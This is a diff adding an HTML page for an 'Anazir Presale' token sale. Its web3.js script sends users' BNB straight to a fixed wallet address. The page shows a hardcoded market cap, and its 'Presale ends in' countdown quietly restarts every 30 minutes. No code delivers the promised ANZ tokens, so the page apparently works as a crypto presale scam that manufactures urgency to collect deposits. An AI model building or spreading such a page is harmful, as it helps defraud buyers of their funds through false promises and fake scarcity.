@@ -1,0 +1,162 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Anazir Presale</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom, #f0f4f8, #ffffff);
+      color: #333;
+      text-align: center;
+      padding: 40px;
+    }
+    .logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+    .card {
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: 0 auto;
+      padding: 30px;
+    }
+    input {
+      padding: 10px;
+      width: 80%;
+      margin-bottom: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      font-weight: bold;
+      cursor: pointer;
+      background-color: #0077cc;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    #countdown {
+      font-size: 1.2em;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    .info {
+      margin-top: 10px;
+      font-weight: bold;
+      color: #0077cc;
+    }
+  
+    @media only screen and (max-width: 600px) {
+      body {
+        padding: 20px;
+      }
+      .card {
+        padding: 20px;
+        width: 100%;
+        font-size: 16px;
+      }
+      input, button {
+        width: 100% !important;
+        font-size: 16px;
+      }
+      .logo {
+        width: 60px;
+      }
+      h2 {
+        font-size: 20px;
+      }
+    }
+    </style>
+    
+</head>
+<body>
+
+  <img src="https://i.ibb.co/wFtB2BxS/89-C52-E36-FF5-C-44-D5-872-A-E16-B7-AA5-E1-FF.png" style="background: transparent;" alt="Anazir Logo" class="logo"/>
+  <div class="card">
+    <h2 style="color:#3293A6;">🛡️ Anazir Presale (ANZ)</h2>
+    <p><img src="https://i.ibb.co/Mk91mWb8/IMG-4734.png" alt="BNB" style="height:18px; vertical-align:middle; margin-right:5px;">1 BNB = 462,143 ANZ</p>
+    <p><span style="color:#3293A6;">Market Cap: <strong>$467,588</strong></span></p>
+    <p id="countdown" style="color:red; font-weight:bold;">Presale ends in: 30:00</p>
+
+    <div class="info"><img src="https://i.ibb.co/Mk91mWb8/IMG-4734.png" alt="BNB" style="height:16px; vertical-align:middle; margin-right:5px;"><span style="color:#3293A6;"><img src="https://i.ibb.co/Mk91mWb8/IMG-4734.png" alt="BNB" style="height:16px; vertical-align:middle; margin-right:5px;">Total BNB Collected:</span> <span id="bnbTotal">Loading...</span></div>
+
+    <button onclick="connectWallet()">🔌 Connect Wallet</button><br/><br/>
+    <input type="number" id="bnbAmount" placeholder="Amount in BNB" step="0.01" oninput="calculateTokens()" />
+    <p class="info"><span style="color:#3293A6;">You will receive:</span> <span id="anzAmount">0</span> ANZ</p>
+    <button onclick="sendBNB()">Buy Now</button>
+    <p id="status"></p>
+  </div>
+
+  <script>
+    let web3;
+    let userAccount;
+    const receiverAddress = "0xa1CF4ed6E81fc19c0f8aeFC06E06B2dE764734f8";
+    const anzPerBNB = 462143;
+
+    async function connectWallet() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        userAccount = accounts[0];
+        document.getElementById("status").innerText = "✅ Connected: " + userAccount;
+        updateBNBTotal();
+      } else {
+        alert("Please install MetaMask.");
+      }
+    }
+
+    function calculateTokens() {
+      const bnbAmount = parseFloat(document.getElementById("bnbAmount").value || "0");
+      const anz = bnbAmount * anzPerBNB;
+      document.getElementById("anzAmount").innerText = Math.floor(anz).toLocaleString();
+    }
+
+    async function sendBNB() {
+      const amount = document.getElementById("bnbAmount").value;
+      if (!amount || amount <= 0) return alert("Enter valid BNB amount");
+
+      try {
+        await web3.eth.sendTransaction({
+          from: userAccount,
+          to: receiverAddress,
+          value: web3.utils.toWei(amount, 'ether')
+        });
+        document.getElementById("status").innerText = "✅ Contribution Sent!";
+        updateBNBTotal();
+      } catch (err) {
+        document.getElementById("status").innerText = "❌ Transaction Failed";
+      }
+    }
+
+    async function updateBNBTotal() {
+      if (!web3) return;
+      const balanceWei = await web3.eth.getBalance(receiverAddress);
+      const balanceBNB = web3.utils.fromWei(balanceWei, 'ether');
+      document.getElementById("bnbTotal").innerText = parseFloat(balanceBNB).toFixed(4) + " BNB";
+    }
+
+    function startCountdown(duration) {
+      let timer = duration, minutes, seconds;
+      setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+        document.getElementById('countdown').textContent = "Presale ends in: " + minutes + ":" + seconds;
+        if (--timer < 0) {
+          timer = duration;
+        }
+      }, 1000);
+    }
+
+    window.onload = function () {
+      startCountdown(1800); // 30 minutes countdown
+    };
+  </script>
+</body>
+</html>
